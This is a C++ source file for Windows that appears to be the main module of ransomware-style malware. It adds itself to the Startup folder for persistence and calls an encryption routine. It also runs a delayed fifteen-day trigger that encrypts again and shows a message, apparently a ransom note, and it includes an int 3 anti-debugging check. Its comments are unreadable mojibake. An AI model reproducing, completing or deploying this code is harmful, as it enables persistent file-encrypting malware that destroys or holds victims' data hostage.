#include <windows.h>
#include <thread>
#include <shlobj.h>
#include <objbase.h>
#include <string>
#include <iostream>
#include "crypt.h"
#include"message.h"
#include"time.h"
#include"debug.h"
#pragma comment(lib, "Crypt32.lib")
//#include"rsa.h"
// ������ݷ�ʽ��ʵ�ֿ�������
void setConsoleOutputToUTF8() {
    SetConsoleOutputCP(CP_UTF8);
}
int fnc() {
    __try {
        //static int (*array_1[])() = { smf, };
        //static int (*array_2[2])();
        //array_2[0] = smf;
        RaiseException(EXCEPTION_BREAKPOINT, 0, 0, nullptr);
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        std::cerr << "Debugger detected by int 3 interrupt. Exiting..." << std::endl;
        return 1;
    }
}
void CreateStartupShortcut() {
    // ��ȡ��ǰ��ִ���ļ���·��
    char szPath[MAX_PATH];
    GetModuleFileNameA(NULL, szPath, MAX_PATH);

    // �����ֽ��ַ���ת��Ϊ���ַ��ַ���
    int wideCharLength = MultiByteToWideChar(CP_ACP, 0, szPath, -1, NULL, 0);
    wchar_t* widePath = new wchar_t[wideCharLength];
    MultiByteToWideChar(CP_ACP, 0, szPath, -1, widePath, wideCharLength);

    // ��ȡϵͳ�����ļ��е�·��
    wchar_t startupPath[MAX_PATH];
    SHGetFolderPathW(NULL, CSIDL_STARTUP, NULL, 0, startupPath);

    // ��ʼ�� COM ��
    CoInitialize(NULL);
    {
        // ����һ��ָ�� IShellLinkW �ӿڵ�ָ��
        IShellLinkW* psl;
        if (SUCCEEDED(CoCreateInstance(CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER, IID_IShellLinkW, (LPVOID*)&psl))) {
            // ���ÿ�ݷ�ʽָ���Ŀ��·��
            psl->SetPath(widePath);
            // ���ÿ�ݷ�ʽ������
            psl->SetDescription(L"Startup Application");

            // ����һ��ָ�� IPersistFile �ӿڵ�ָ��
            IPersistFile* ppf;
            if (SUCCEEDED(psl->QueryInterface(IID_IPersistFile, (LPVOID*)&ppf))) {
                // ���ɿ�ݷ�ʽ������·��
                std::wstring shortcutPath = std::wstring(startupPath) + L"\\MyApp.lnk";
                // �����ݷ�ʽ
                ppf->Save(shortcutPath.c_str(), TRUE);
                ppf->Release();
            }
            psl->Release();
        }
    }
    // �ͷſ��ַ��ַ����ڴ�
    delete[] widePath;
    // �ͷ� COM ����Դ
    CoUninitialize();
}

// �߳� 1 �ĺ���
void ThreadFunction1() {
    //createTxtAndShowMessage();
    encrypt();
    std::this_thread::sleep_for(std::chrono::seconds(5));
}

// �߳� 2 �ĺ���
void ThreadFunction2() {
    createTxtAndShowMessage();
    // EncryptFileWithRSA();
    std::this_thread::sleep_for(std::chrono::seconds(3));
}

// �߳� 3 �ĺ���
void ThreadFunction3() {
    std::this_thread::sleep_for(std::chrono::seconds(4));
}

// Windows �������ں���
int main() {
    // ���ؿ���̨����
  // HWND hWnd = GetConsoleWindow();

    //if (hWnd != NULL) {
        //ShowWindow(hWnd, SW_HIDE);
   // }
    
        SetConsoleOutputCP(CP_UTF8);
        //createTxtAndShowMessage();
        //mainFunction();
       // fnc();
    // ��������������ݷ�ʽ
    CreateStartupShortcut();
    encrypt();
   
    
    // ���÷�װ�õ�
    // �����߳� 1 ���ȴ���ִ�����
    if (shouldRunAfterFifteenDays()) {
        std::thread t1(ThreadFunction1);
        t1.join();
        // �������ʮ�����Ҫ�������еĴ���
       
        std::thread t2(ThreadFunction2);
        std::thread t3(ThreadFunction3);
        t2.join();
        t3.join();
        // ���Լ��������������Ĵ����߼�
    }
    else {
        // ��û��ʮ���죬����ѡ�������ʾ��Ϣ��������������
        std::cout << "��δ��ʮ���죬�ȴ���..." << std::endl;
    }


    return 0;
}